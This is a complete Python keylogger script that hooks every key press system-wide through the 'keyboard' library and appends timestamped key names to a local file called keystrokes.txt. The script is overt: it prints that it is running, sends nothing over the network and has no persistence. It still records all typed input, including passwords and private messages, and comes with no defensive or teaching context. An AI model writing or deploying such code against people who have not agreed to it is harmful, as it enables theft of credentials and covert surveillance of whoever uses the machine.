import keyboard
import time
from datetime import datetime
import os

# File to save the keystrokes
log_file = "keystrokes.txt"

def on_key_press(event):
    # Get current timestamp
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Format the key press with timestamp
    key_info = f"{timestamp}: {event.name}\n"
    
    # Append to file
    with open(log_file, "a") as f:
        f.write(key_info)

def start_keylogger():
    # Create file if it doesn't exist
    if not os.path.exists(log_file):
        with open(log_file, "w") as f:
            f.write("=== Keylogger Started ===\n")
    
    # Register the key press callback
    keyboard.on_press(on_key_press)
    
    print(f"Keylogger started. Recording keystrokes to {log_file}")
    print("Press Ctrl+C in this terminal to stop.")
    
    try:
        # Keep the program running
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Keylogger stopped.")

if __name__ == "__main__":
    start_keylogger()